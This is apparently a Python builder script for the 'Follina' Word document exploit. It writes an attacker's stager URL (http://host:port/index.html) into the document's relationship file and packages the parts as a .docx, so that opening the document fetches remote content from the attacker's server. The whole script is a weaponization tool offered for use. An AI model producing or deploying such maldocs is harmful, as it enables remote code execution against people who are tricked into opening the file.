import argparse

from zipfile import ZipFile

parser = argparse.ArgumentParser(prog='PROG', conflict_handler='resolve')

parser.add_argument(
    '-f',
    '--filename',
    default = 'follina',
    help='the desired name of the document'
)

parser.add_argument(
    '-h',
    '--host',
    default = '127.0.0.1',
    help='host ip'
)

parser.add_argument(
    '-p',
    '--port',
    default = '8000',
    help='host port'
)

parser.print_help()



doc_rel_path="docx/word/_rels/document.xml.rels"
temp_doc_rel_path = "temp/document.xml.rels"


def createfoldoc(args):
    host = args.host
    port = args.port
    document_name = args.filename
    stagerurl = f"http://{host}:{port}/index.html"
    with open(temp_doc_rel_path) as file:
        filedata = file.read()
    filedata = filedata.replace('{stagerurl}',stagerurl)

    with open(doc_rel_path, 'w') as file:
      file.write(filedata)

    zipObj = ZipFile(f'{document_name}.docx', 'w')
    # Add multiple files to the zip
    zipObj.write("docx/[Content_Types].xml","[Content_Types].xml")
    zipObj.write(doc_rel_path,"word/_rels/document.xml.rels")
    zipObj.write("docx/word/document.xml","word/document.xml")
    zipObj.write("docx/word/numbering.xml","word/numbering.xml")
    zipObj.write("docx/word/styles.xml","word/styles.xml")
    zipObj.write("docx/_rels/.rels","_rels/.rels")
    # close the Zip File
    zipObj.close()

createfoldoc(parser.parse_args())